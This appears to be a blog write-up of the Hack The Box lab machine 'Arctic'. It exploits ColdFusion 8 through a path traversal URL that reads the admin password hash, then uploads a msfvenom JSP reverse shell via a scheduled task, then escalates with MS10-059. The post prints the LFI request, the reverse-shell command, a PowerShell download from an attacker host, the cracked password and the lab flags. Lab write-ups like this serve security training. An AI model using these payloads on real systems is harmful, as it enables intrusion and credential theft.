---
layout: post
title:  "HTB Artic Windows"
description : Tools and techniques used, LFI, hashkiller, jsp-shell
tags: HTB, Coldfusion, hashkiller, windows-suggester
---

# HTB Artic
# Recon

```ruby
Nmap scan report for 10.10.10.11
Host is up (0.048s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
# Exploitation
* We noticed that port `8500` is open.This port is used for Adobe ColdFusion.
* We investigate further and we find a web app running.  

![](https://lh3.googleusercontent.com/MPpzTT1fUn_dnDqNFBouPgLrdpz42g_boV6kvtZ3zSICG9i2U-lt3006mkvihoNRm1oSaCHCi8iBmigihL0GfaSm95zNPU9BHLXOcgWb42UHFa_SHej_z9aegRpYcXxP_7n-AlseZt0y055LAPkdgum54nA9qfedtkcGDvXg5bRRPjn59IJtWHyI4QUommXcHA3jauzjo0XfeURw-k-rkL4dEMFmqE55yBRYW288P-Fzp6pB-f38WCBYo2c6-5lLHwVo4QdGCV05ddO7O2yn-xBAV0H-YHQvhaUpQ1CK-roJG0TA_QPONcsTi0NfLvtQwD-MPRswxMdSEPOASC2h1UD4C8NgvERwo8IuruMzy1S2j_aemAmaWLKvxYvQqe7Y83KFa_sfS7IwAetqCKdKbwSMXHWwy1aK1_eWIKWvmVncDqttJKd9OBjq8f6O8IFeNUeCnIfteEXLN4upff6w_dlw7fgcK2z42pEoE1VwRKFsqt5oUMN868TWmQp5EXI3cTGPstS_4zesKMIL_4Mm4hJaY11iYfJt8VYBhTSZB5zo6s-TgW2JU7JwwLI2pq4dC6VMNTZot-Uok4yJLrFsU8i_XQ9Jry6L5YDZBNT76Q6kwgXb2_2M1blO-8SgxhxZUK_z3ezZ8dZTUT8z8jueFt81cjDjutQwZ0Ct50GPVkg5bYl1AaNRRTo=w404-h195-no)

![](https://lh3.googleusercontent.com/1q7e_7yA20GcWefxFljf6vTMus6fJJgTnPKexMrJzFkmB23569xCcwDCI-BxlgO6VorvW1AHHx6WVy8XmLIZIjJDL6T5xcCNhMInaAcYMjI4yqc_LX1ma3krqMY-ODBUBJiGPoYYd883g3XdbqpNfEyGGntGnAvMI94h4r5hgPHo5sfcq4c24qGRygvGLgyy6to6V8Nr3zzGft3GdkfwzND_ZbkpVE_MMiyd0xAWCw_qp3xMIhIpOJjOmV0gGFXuoZtynOWAG7TkAmmAcuLjaqluMPPvYrSxgllQ1bcxYN1pm3geTJ3g3fU69Te6oESiQ9bcLfNOx0DJCxwWtKbhASc7YjjSnU-s-sx-kyl3c55zerlWuJAbEG8_u3aTIfBMOIpBR6rYNQL41UTrMhaCZpwyz1eopzxKtwexZTSBJSqIPgqB3EO3kmCKrBpoe1EZA7nlQh6sjE36lYxnVtzYAIdlRMUewU8yjhLAuXfTbFoJ4yUNZjo10iYnB785EZLzy3XpoHX1a6-tbzV8W3A8Htfa4kvGShj_BiuzEBiK9gl_wrEM1KolRwPToOc9h16EBtJm1F6ATh7Fl3xW8ugovrClcC6w7kL1-IMg0EWyFQC7yffOk-qisVZ7elliubcFO_CoKbygVv0hDn6MO9yq_AppdbZlf23kzdIiDhSboVBc2O98H56vJO8=w523-h297-no)

* Finally we we're able to locate the admin page. This provides us with very important information like the adobe version running.
* Some googlefu reveals that this version of Adobe is vulnerable to LFI.
- PoC:
```
 http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en
```
* So we exploit the admin page to obtain the password hash for the admin user

![](https://lh3.googleusercontent.com/A22EMJ2VPNOYLkGD_fhb8FZODYdwUEF70hiMtKuMPrsFMN2QRrQtiYPrAZPp33oKbh9SUpP9jrDgC_x1KTXY20qqHWWSxcLOL9lrfkiIFqDUSY5CJYu7btbqeHQv82NtXIUW8nzVwX4ZGPfB3dgKSYXyL6QVwqA17I0fRlCcTtMt1LYZoduWkLrUmSsIPys0w-vFox_2FgaB2kakMItBT9Lby4AhQRMGvCfR4CurxMxkSbDohkio8qD54I4Z-aWAxZMdAf9PQzJXxcqLg035_M0_zhpZ30HVVYW3iFZ0I5oC7gPzxmUWESbbEgjgOmfQrowb3VQP2GEK9f-jtYBELSeDJ2KIs_OQ637jWgZQ2zu6L1PRtiOY7ah3QtscgFKicn52Q29XYw059K_SZX3sKJpPq-HwbnO2RuQJhjH1v7kvqm7XRiy35PKM7lA-bKZoBwLeDj54Gm48pQicOGWjWf8780LePz9-5GEQqjBK8JA1z4Pl6oq5rDVbcv5wz3HUnrZCYZjbVbwFnMhxmfOEvkY6tPg1eKtHjA4DoaqFIh0Zf2c-FMiN4wvwpE3g2Vs8v765muJEwQAWcFm5I3ImRUIxQ-7fw_qiuwFSnWbGeTjQnL58sJ63natllTMtoOW5mwXS754quSI4PP95T2H2bdJhwVRQngAqL6Vc2u0AS6b7znw0IGxv4yI=w520-h464-no)



* We crack the hash using a cracking website `https://hashkiller.co.uk/Cracker` and we our SHA1 password `happyday`

* We login using the admin password

![](https://lh3.googleusercontent.com/a0jn07Idy0VE8z77tsRLB2OsJdk07-9WyiXiFDOAAMECzfW5yClAyQDBtR911AtC2hMcV0HXk9CfnRwfl6OV_Xxdn-UGHlsrFArhFATwdMwOmobatWaPjsJFaSDpRPVnWmDWYRdokCne1PJXcR_fx-OOQce5W2mCNqYmyu2qzF4eYyQPfXzukDhDkIS2Sn05EYpeNa8C0spY-J08tPVIryxPWDs5Ddb1WvKqCRT7gWYPT0Aml-LQ5Ofq2bDFrhhwtUQOu2V9FYS84p06CV7DWuxGqtRV5sR5MHDTnnoWvawDyT2MeRG_uDlFL0JfEIx7A4_zVyifA3F9GPbSzG9pUUdPh26IWJZQKDRRNZXjo7ZqbdWnVtFVEC0JNFUqQqe3PR8vs2eIGN3aDpKo-_SVPUL44myOU8zr1EKqr5uSR2gNiPmB-P-2F8p5OY5FS54owfScwuJsyNh6TcR1_kpX4uLrjgVfVoz5GBjORHaXPbKPWh2yNlMipSRk30mUafo1ObJIw-ZCy5nWHW2dTw-r6Qy4kJzRdkPHAcvSkRN3lkXvtkkbTpS_IhS8FiBSd8-TvFf4k7hktXmIqVonquQY-82uhQOQhkj9fkJJZDdbce304fs__zSyT9QOCH43ZLQt3nJn4cCW3JXUhE9SMfaXfN6eVOtWZMbWSJT9iJbbAjVIKXunlUQXyvw=w601-h491-no)

# Exploitation
Once on the admin panel we choose scheduled tasks option from inside Debugging & logging for scheduling new task.
![](https://lh3.googleusercontent.com/LEq9ySUtSZiercJCBL1BhGUM9G7a3DF87T01ALBPnrg0Y6Q8lNkOuI-g0MuHjsu7p6A8kI4PsGmE8SjA_55jN8gHCOBKUIfXGAx9S3FYQyA0HTyV5qTZhYVAHj82MV4yn1QREOS9xrzSXy0IzIb32OGlRzcr_sEnFlpKG0eLEu77-dwmBaflfRN86vNzAvUu6OCrEsu0v4rSZYlfR9ysxs1X-qNDFzRQtFg7xsyRrZxsuFugvxhWv72kbzQDCV8_ry_4BAjw4gWgNOMM9DP-3AOKhi9LqD3dK3ru-HC2wRvZ-UAQMUVmwdHA2rbn9zH6O6HHHW-FG8FEqDgvW5U-EFxBiMvlmYQGlBRSPe1ru3t8aEn-pqOa39uOXLpPvw3N3dJNpSVJKHseXkR0OwfHVI_j6pcf2cPn_zIVIddDX9Vf3Hb4OmWxIz8iiHz84gtc4Q-sNaOSyd0RbeQqnAtxk5LrZVzvP3wd2VlC6daMVmy_I6qUc_4c2MV-mhKPrqQOBNx0KpNK-LY-d42bwa0Hw47v2D9d2hcOSr2a2mgWAnDMgJmJWpWxBpqLLUPuMwwpLQsq06IBT_KkT6VZoKHgq6xeKggKrOmKDsQR3yGHWS1u7VxH-r1HWQSnAv_iBG1lU-H5NnSftPZ7uzOGmByit4fBl5Kzf8YkqxNHVSqDF8iNKgjGujK0Xwk=w660-h411-no)

![](https://i1.wp.com/2.bp.blogspot.com/-LjTRFFM_1ro/Wr-nXwWY4mI/AAAAAAAAV5I/j392zbTSVSAnnxhTwrWklhQL0hizsgLiQCEwYBhgL/s1600/9.png?w=687&ssl=1)


From the schedule task settings we can upload or .jsp shell
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to
Connect On> -f raw > shell.jsp
```
We set up apache to serve our payload.
![](https://lh3.googleusercontent.com/Min2o6TIiNxI-w_6sZkca7T7KNOT1fNgjn6feJlQS2vkgQie689AejBaHHqejyQY-nFFpENPqcZ1DP4AVNFNkXg8_i0dC8sH0R_4wLjGEzn2r--p4UO3nANVgF5K7wUDqk-9PhUalvrVhRqZ5AUPOuM8blGw8xOicCz-FmtAYOaz1yLvAjCwC4qcZVnUUKLW9Spw3cbbcjRWvHtdgCeOpwRhMHKv5lRYu64cgp-ie_qWsFudR8CdHKVJHrm2VopUUgw3QyZY6bnrZu3LZLIlvaCsVTVPnQbszTmlaRcbwxxAg1pjzE0j8IarAgQuHq64pUlTRLXXTWDlCmPO1FpWIgldozhU8fqu7Gb3it-OStT-s15EHto_2afBh9kj08qj87rKy-iPYwijXt9lO9niZj8Z9aQ7xv4P497XaSm9oa9XwbwPfOKwLJKUbhuOCcXdpCX1tWBxqSddzWikNaFk-3QW92MbfxTCHxdPCPO3u9M3M45q2ACNrQ74zLefB-OLPnmWHEEK_pocCa5wDgBTLZek0_xSCLt_x7w0YyttR-ZkJzFVtOXaL_xlYlTaaERRFQoBdzpYb_xCc2-vacEkzyoRwJIvQPmQAsraTStiZOsafDPq-U0ebr-2XHg1G1kXDGs-tQaYY67jBu0JYLv5gbqjLzT03LGvU7znxeBUjxC9r2g41pY0u7o=w1027-h245-no)

Then we proceed to run the task so our payload can be executed
![](https://lh3.googleusercontent.com/veug3uR-KmVK52EuD7-30Ogj9fDcl5kKRq09M3GFg0kCYbjVrbqFxa5TRIdM3YQuWK_1f_s-Y1oeXgl3XT8IRIuDkrsblzW6ph5IC8jwPFmy8HlzTCdr69PdeWqfLr4xEUqdvzvdRnFlj6S4-JvlMKy7tPQVpmb9EmKWoMhRVH1ydrHKb-3CdqD0hOn-v_70n-SwVHiH_amiu5ZKzhRntirWYNadxOehED8INqiXltTb6FQCyX0mLf9bwDyhwkKDo62WqTELPqXmdeRb5YGYATRqLqHKTNw85eIwerUaacgw9NrfpiWbfcvtGrYzAGogC661qTV9k2ljwWrvmr-YJApEo77rVe-lSR4w9yc_AGDqfuBjkqpAk7SbGEzN0VFr3TYBuxOsFe2fnk_yBqCa2jfSVGlmmJ3eqhWl0l9VqcnSpQnJjvLLS2cumQm_czk1jQaTzi5L-zbEfuB4YWzSbtvc073MWyGJrMFiBAsoc1HRvsz0hrqCo2Uwp9C7yrK-w03YCauhxuA-iZiIcGqv_V9zED0bdMkxG6UIVBrEBMdcTZbIhUbXN22TOmyVctxcl6G_rzmpaoBslO4r1IHBrXw1JTeRh-ONNsVkeet4FS_aINDcThry4-qgQ7eKRx918zFAfKWl9Du7QPozdLVkoBMLKGwu54sRuZgYof_NTBzjrrw9V1O3fzE=w611-h256-no)

Finally, we set up an nc listerner and we catch our shell.
![](https://lh3.googleusercontent.com/W__r2reVLTX0-3dTnY1fHPVfnwnJnCudwSOdykpYWPwjtPnY9eeqNDYvmPvRKWiK3A7rk1v8vCi2aJTdacu0mqswn2NJuD5fXbcqSGmSQVn8DFfhq5XBqOpyYh8M8DREdpeW3_Tz0L8fV9ZtIcgIce_D83SYhDyXgCqh9l3bCUbjPPS2hgzqnmc4lEniZqf_H1az5vrXe_b5z5kt1sSGbhtbMrmANvjIqDswKKOFfECRsImNYwQhWN_h2cECwoh9ZSbdmLSsGL1YWLeO5Ul_HyflbSE1RReHm4U2Myc_D2D6Slmw_xMUNhfAdttVj66vy-Ve1oyY0QER_zDMEuoKvrYdI7ySFZrp7yJ7ZKSkJiCe1huswyJAHvyeE4fdNU8ffRdWiWMooQFD3aHcSx1vi3YyDqmOWhzsjWrkrsUzdqhOWUC-N86nnVxWhcUFV99yhc7sShtymX9xES1mFKtPdUpwdMbG0PNMbSTpZx6chrAQKZqM36IfGUjkx6fDwsJFCQDp4VHp10-4CrGU1W4PsL3Vo7imPTZfDQ1mwHm2mZDyE6cddXMojT2nB6GhU5AKkTUL9GQpqllKyfsHJ1UU1SQ4WjvJW74OKso5Nf2CAHHw9Psa5lPQXGNAc-Z-oRFznWSL6nGYXC6bQdoPhwTxGb4SwyB7sJiik-h_6Tvn4ECV3foiSMLWsmY=w671-h230-no)

# Privilege Escalation
We run windows suggeters and after a lot trials and errors I find a suitabl exploit
* MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799)

```ruby
python windows-exploit-suggester.py --database 2019-10-11-mssb.xls --systeminfo
systeminfo.txt
```
After some google I find a compiled version of the exploit, we dowload the file and run it
```
powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.14/
Chimichurri.exe', 'Chimichurri.exe')"
```
![](https://lh3.googleusercontent.com/epn8X8AntKErOlKnNUuVw1nK6LXq32S5kuCC27WqFVE21wmFWkCB0jYswzA_R7FE_VySFOnC35HPiUsp-WdXHusyJfK8T8kl2gqw3GX0pcEIf9Dsnq4E26YeIipm-09eV3ChIW3-hsAe_iKKLQ1JGDNB6bd5UYKIujfoZwlfk5db_H9YIIrggCJz0fWKfkXOd9toqrK2TimuVtTkUYC8VEJHTeCE0GMTICabHeERzM1chvTHUsR93mbj3_JsTOrK3xpWlUcKpxcxssonCXrQwNO82yWvsRP15n5eWa7OYMD76iDbi8aAfUr1b2TdlNaHdIl3Js7C4SPv4cpWd46WBt640jSm2hC8F8Kf61FqjzTPIhwvRRiyQRxMdqnNttv0Wepn1fQ3VNd5EMo67kDP6ZEAlVtbutI6FpZ3SdFhr0F0jawrgxTEvh6QdoyVE7e-Mj_IxJDJYPcA-_f8hAv0_Zi-7H09pMAL6zt-BGCqCe5-4pydPNOQi7pZuRff1KKChiv8SlawqG1-G5V6O0INztk4vxIJTUFCLTfK8GQXi2A-XOtuCwMJgNX0PgfyS4HG1TyVxrli9YE_32uTj8dUnMRlkY_7a8vlKe7Oty-_b4sJ2g66fCSVZx5PlhO8vvNOsempaSCwGl6U9r9GIy6m7fM7IikramDNYbZHfKB5BPqrrFawAk-La2M=w1327-h497-no)

![](https://lh3.googleusercontent.com/diUlDO3Ebgxfj1_edvI_NVTUb5dJNV_ffuJ_cUVOToqr3JwXpfRmx94DtSnrxXSL2w4QoG7h5hZIt468Lg_btTvVgQGA4AU-7wN9FoYz1IKx4bG_0GknHdZYQh0Oc-YQXdEHYnUaAPt7dVcNxGhzUdRkAi06ZzZDrBWUwzG45yRbbMpq7IZe5x7Gc6GUx8HIs9qHi__LjFqgQQhmBsiwuIGGYT0_dSTG5xvdAB1JLNte7YUZ5FaDzdMWRNQWUO5ExoD_G9hm27znUO_sAttyJkS2o_B1c6zHB3brIkJMgot6GqvJJuiIG__CRkZJ7q5_m32jCjFhqagmpIhl1XkXYJKMLKLq6b6UXu3lpWQoAUV7kU5z1nJ0BD1ztKnRFToZTewG0rc6aCTJHF0O8w_G28KMLtS5_786lodnceDdEEIzh4kf5h_JxsbZjSXiFTPlCwQUU_tZb8HJwQxsYdnWTkm7GMcluG_0z68Bt5vmrToLJ6v_r2eXjmPyxSRh1-6ZwSTv9MvKD0jcaxBzVYtiU_Pivk-VzTrOrtqNNNVZTCQhx22OlXlRV-0-A_FeTvPAa2tzLYjsLQ3EvIgUBLOFMQkKCdcRZwR7lGK2LCtJDDgcr8xlj9rIVOS3djjGKJETRLspPm_54KCkvhX3XbRnDAwMSL6a-ZgmPQXNzyHCLNh_xbk6Gut-8TM=w640-h466-no)

```ruby
USER "02650d3a69a70780c302e146a6cb96f3"
ROOT "ce65ceee66b2b5ebaff07e50508ffb90"
```
